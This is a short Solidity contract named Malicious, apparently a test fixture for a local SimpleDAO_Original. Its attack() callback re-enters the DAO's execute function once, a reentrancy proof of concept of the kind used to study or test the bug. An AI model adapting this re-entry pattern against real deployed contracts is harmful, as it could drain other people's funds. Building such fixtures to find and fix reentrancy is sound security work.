// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {SimpleDAO_Original} from "src/v1/SimpleDAO_Original.sol";
import {console} from "forge-std/console.sol";

contract Malicious {
    SimpleDAO_Original public dao;
    uint256 public proposalId;
    uint256 public timesEntered;

    event DebugAttack(uint256 count);

    constructor(address _dao) {
        dao = SimpleDAO_Original(_dao);
    }

    function setProposal(uint256 id) external {
        proposalId = id;
    }

    function attack() external {
        timesEntered += 1;

        //Try to reenter
        console.log("Attack called! timesEntered =", timesEntered);
        if (timesEntered < 2) {
            //Execute
            dao.execute(proposalId);
        }
    }

    //helper: encode attack function
    function encodedAttackCall() external pure returns (bytes memory) {
        return abi.encodeWithSignature("attack()");
    }
}
